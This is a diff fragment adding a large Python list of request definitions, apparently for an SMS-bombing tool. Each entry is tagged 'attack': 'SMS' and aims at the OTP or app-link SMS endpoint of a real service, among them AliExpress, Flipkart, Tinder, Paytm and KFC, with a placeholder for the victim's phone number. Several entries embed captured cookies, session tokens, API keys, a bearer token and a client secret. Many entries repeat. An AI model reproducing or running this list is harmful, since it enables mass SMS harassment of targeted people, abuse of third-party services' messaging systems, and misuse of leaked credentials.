+                'bx-ua': '223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==',
+                'bx-umidtoken': 'T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=',
+                'content-length': '1561',
+                'content-type': 'text/plain;charset=UTF-8',
+                'cookie': 'aer_abid=e7837ca8509e6c9a; acs_usuc_t=x_csrf=3gi48phl5j_s&acs_rt=7122813d0f5b49338fcecc4affd772da; xman_t=RYU45Rw/P4JNJF84NKgT4dq70sIp4TguFPGJj8BZOhkRd0TBje5c2RaODRkrwPhT; xman_f=5un0UFmYvrNgACLBAum4oWM8RAUqunUYiCgw4FGrjNzKARmwUxko2lpQqldFKK5Of1fWk0gHOItRELxCz/Cp/nIE6bPX4/Fo3fBI1z596wNChx5//UL6WQ==; xman_us_f=x_locale=ru_RU&x_l=0&x_c_chg=1&acs_rt=50c77cefad7a4021b41f0f6f2a9ced49; intl_locale=ru_RU; aep_usuc_f=site=rus&c_tp=RUB&region=RU&b_locale=ru_RU; xlly_s=1; intl_common_forever=UYSq6AZOhhaI4ZOz9j5s1/mt5Mkg2bUOF+BzgAF3t937OTKSMIfdaw==; JSESSIONID=44828D31960F5FA579B40154BB4ABEEC; tfstk=cl3CB9geNY3ayZYl-JOwU_f7xbahZx5bNHwnOptNgV0hxclCiSb4hNIrqTUzw51..; l=eBM9vtwITHaZfir8BO5ahurza77TmCOfcsPzaNbMiInca6nOaFiMWNCUvWrpudtjQt5jeEtyLtAZndny8SU3Wtw7VXuPMUGlifppRe1..; isg=BCUlHVXRqkixJ84UtWrpsDHoNOdfYtn0gFsUSCcP6txrPk2w47MwxZUYyLpIPvGs',
+                'origin': 'https://aliexpress.ru',
+                'referer': 'https://aliexpress.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-aer-cna': '-'
+            },
+            'data': {
+                '{"phone': number,
+                'returnURL': 'https://aliexpress.ru/", "channel": "CALL", "environment": {',
+                'uaEncrpt': '223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==',
+                'umidToken': 'T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=',
+                'regSrc': 'AE_MAIN_LOGIN", "securityTimestamp": 1668031201204',
+                'refer': 'https://aliexpress.ru/',
+                'userAgent': user_agent()[0]
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'aliexpress.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init?_bx-v=2.0.52',
+            'headers': {
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Length': '407',
+                'Content-Type': 'text/plain;charset=UTF-8',
+                'Host': 'clientsapi03w.bk6bba-resources.com',
+                'Origin': 'https://www.fon.bet',
+                'Referer': 'https://www.fon.bet/account/registration/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'cross-site',
+                'User-Agent': user_agent()[0]
+            },
+            'data': {
+                'advertInfo': '',
+                'birthday': '2000-10-25',
+                'deviceId': '2340BBFFD39BD54C3A914A90D5582A63',
+                'ecupis': 'True',
+                'email': email(),
+                'emailAdvertAccepted': email(),
+                'fio': '',
+                'lang': 'ru',
+                'password': 'Hoho_HO123',
+                'phoneNumber': number,
+                'platformInfo': 'user',
+                'promoId': '',
+                'sysId': '1',
+                'webReferrer': 'https://www.fon.bet/'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'clientsapi03w.bk6bba-resources.com',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess',
+            'headers': {
+                'accept': 'application/json, text/plain, */*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '29',
+                'content-type': 'application/json',
+                'origin': 'https://www.myacuvue.acuvue.ru',
+                'referer': 'https://www.myacuvue.acuvue.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'cross-site',
+                'user-agent': user_agent()[0],
+                'x-api-key': 'XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu',
+                'x-app-version': 'PWA 2.3.1'
+            },
+            'data': {
+                'phoneNumber': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'api.myacuvuepro.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.myacuvuepro.ru/myacuvue/oauth/mobile',
+            'headers': {
+                'accept': 'application/json, text/plain, */*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '29',
+                'content-type': 'application/json',
+                'Origin': 'https://smartseeds.ru',
+                'Referer': 'https://smartseeds.ru/account/registration',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'cross-site',
+                'user-agent': user_agent()[0],
+                'Authorization': 'Bearer ODFlODkwNjM4YTdmN2E0ZWM1Yjk4YWU1NGY2NDFiZTJiNDFhNDJlZTM1ZDY0NDc5MDYyN2QzYjdlNzI5ZGNhMw'
+            },
+            'data': {
+                'profileDetails': '{',
+                'individualTaxpayerNumber': number,
+                'farmer': 'False',
+                'vatPayer': 'False',
+                'exportBasis': 'False',
+                'contactFullName': 'Бла бла бла',
+                'email': email(),
+                'password': 'testpassword1234',
+                'verificationCode': 'None',
+                'phoneNumber': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'smartseeds.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://smartseeds.ru/api/native/v1.0/cargo-owner/validate',
+            'headers': {
+
+            },
+            'data': {
+                  "profileDetails": {
+                    "individualTaxpayerNumber": "6163027810",
+                    "farmer": False,
+                    "vatPayer": False,
+                    "exportBasis": False
+                  },
+                  "contactFullName": "Бла бла бла",
+                  "email": "testmail@fi.ru",
+                  "password": "testpassword1234",
+                  "verificationCode": None,
+                  "phoneNumber": number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://member.daraz.com.np/user/api/sendVerificationSms',
+            'headers': {
+                'X-CSRF-TOKEN': '57343b8557abe',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Origin': 'https://member.daraz.com.np',
+                'Referer': 'https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG',
+                'Cookie': 'client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33'
+            },
+            'data': {
+                'phone': number,
+                'type': 'OTP_REGISTER',
+                'lzdAppVersion': '1.0',
+                'X-CSRF-TOKEN': '57343b8557abe',
+                'ncToken': {
+                    'csessionid': '01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc',
+                    'sig': '05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du',
+                    'token': 'QPXW:1638536554908:0.22529358478093664'
+                }
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://securedapi.confirmtkt.com/api/platform/register',
+            'headers': {
+
+            },
+            'data': {
+                'newOtp': 'true',
+                'mobileNumber': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php',
+            'headers': {
+
+            },
+            'data': {
+                'mobile': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.frotels.com/appsendsms.php',
+            'headers': {
+
+            },
+            'data': {
+                'mobno': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.gapoon.com/userSignup',
+            'headers': {
+
+            },
+            'data': {
+                'mobile': number,
+                'email': 'email()',
+                'name': 'LexLuthor'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://login.housing.com/api/v2/send-otp',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://porter.in/restservice/send_app_link_sms',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number,
+                'referrer_string': '',
+                'brand': 'porter'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://cityflo.com/website-app-download-link-sms/',
+            'headers': {
+
+            },
+            'data': {
+                'mobile_number': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.nnnow.com/d/api/appDownloadLink',
+            'headers': {
+
+            },
+            'data': {
+                'mobileNumber': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://login.web.ajio.com/api/auth/signupSendOTP',
+            'headers': {
+
+            },
+            'data': {
+                'firstName': 'xxps',
+                'login': 'wiqpdl223@wqew.com',
+                'password': 'QASpw@1s',
+                'genderType': 'Male',
+                'mobileNumber': number,
+                'requestType': 'SENDOTP'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://unacademy.com/api/v1/user/get_app_link/',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.treebo.com/api/v2/auth/login/otp/',
+            'headers': {
+
+            },
+            'data': {
+                'phone_number': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://www.airtel.in/referral-api/core/notify',
+            'headers': {
+
+            },
+            'data': {
+                'messageId': 'map',
+                'rtn': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://pharmeasy.in/api/auth/requestOTP',
+            'headers': {
+
+            },
+            'data': {
+
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.mylescars.com/usermanagements/chkContact',
+            'headers': {
+
+            },
+            'data': {
+                'contactNo': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://grofers.com/v2/accounts/',
+            'headers': {
+                'auth_key': '3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7'
+            },
+            'data': {
+                'user_phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.dream11.com/sendsmslink',
+            'headers': {
+
+            },
+            'data': {
+                'siteId': '1',
+                'mobileNum': number,
+                'appType': 'androidfull'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://www.cashify.in/api/cu01/v1/app-link',
+            'headers': {
+
+            },
+            'data': {
+                'mn': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://commonfront.paytm.com/v4/api/sendsms',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number,
+                'guid': '2952fa812660c58dc160ca6c9894221d'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin',
+            'headers': {
+                'Referer': 'https://online.kfc.co.in/login',
+                '__RequestVerificationToken': '-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01'
+            },
+            'data': {
+
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
+            'headers': {
+                'Referer': 'https://indialends.com/personal-loan'
+            },
+            'data': {
+                'aeyder03teaeare': '1',
+                'ertysvfj74sje': '{cc}',
+                'jfsdfu14hkgertd': number,
+                'lj80gertdfg': '0'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.flipkart.com/api/5/user/otp/generate',
+            'headers': {
+                'X-user-agent': user_agent()[0],
+                'Origin': 'https://www.flipkart.com',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            'data': {
+                'loginId': '+{number}'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://cloud.mail.ru//api/v2/notify/applink',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number,
+                'api': '2',
+                'email': 'email()',
+                'x-email': 'email()'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.gotinder.com/v2/auth/sms/send',
+            'headers': {
+
+            },
+            'data': {
+                'phone_number': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://youla.ru/web-api/auth/request_code',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.delitime.ru/api/v2/signup',
+            'headers': {
+
+            },
+            'data': {
+                'SignupForm[username]': 'username()',
+                'SignupForm[device_type]': '3'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.icq.com/smsreg/requestPhoneValidation.php',
+            'headers': {
+
+            },
+            'data': {
+                'msisdn': number,
+                'locale': 'en',
+                'k': 'ic1rtwz1s1Hj1O0r',
+                'r': '45559'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6/',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number,
+                'device': 'Windows+v.43+Chrome+v.7453451',
+                'app_version': '870'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
+            'headers': {
+                'Referer': 'https://indialends.com/personal-loan'
+            },
+            'data': {
+                'aeyder03teaeare': '1',
+                'ertysvfj74sje': '{cc}',
+                'jfsdfu14hkgertd': number,
+                'lj80gertdfg': '0'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://m.redbus.in/api/getOtp',
+            'headers': {
+
+            },
+            'data': {
+                'number': number,
+                'cc': '{cc}',
+                'whatsAppOpted': False
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://my.newtonschool.co:443/api/v1/user/otp/',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://mobile-api.qiwi.com/oauth/authorize',
+            'headers': {
+
+            },
+            'data': {
+                'response_type': 'urn:qiwi:oauth:response-type:confirmation-id',
+                'username': 'username()',
+                'client_id': 'android-qw',
+                'client_secret': 'zAm4FKq9UnSe7id'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://securedapi.confirmtkt.com/api/platform/register',
+            'headers': {
+
+            },
+            'data': {
+                'newOtp': 'true',
+                'mobileNumber': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php',
+            'headers': {
+
+            },
+            'data': {
+                'mobile': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.frotels.com/appsendsms.php',
+            'headers': {
+
+            },
+            'data': {
+                'mobno': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.gapoon.com/userSignup',
+            'headers': {
+
+            },
+            'data': {
+                'mobile': number,
+                'email': 'email()',
+                'name': 'SpeedX'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://login.housing.com/api/v2/send-otp',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://porter.in/restservice/send_app_link_sms',
+            'headers': {
+
+            },
+            'data': {
+                'phone': number,
+                'referrer_string': '',
+                'brand': 'porter'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://cityflo.com/website-app-download-link-sms/',
+            'headers': {
+
+            },
+            'data': {
+                'mobile_number': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.nnnow.com/d/api/appDownloadLink',
+            'headers': {
+
+            },
+            'data': {
+                'mobileNumber': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'newtonschools',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://login.web.ajio.com/api/auth/signupSendOTP',
+            'headers': {
+
+            },
+            'data': {
+                'firstName': 'xxps',
+                'login': 'wiqpdl223@wqew.com',
+                'password': 'QASpw@1s',
+                'genderType': 'Male',
+                'mobileNumber': number,
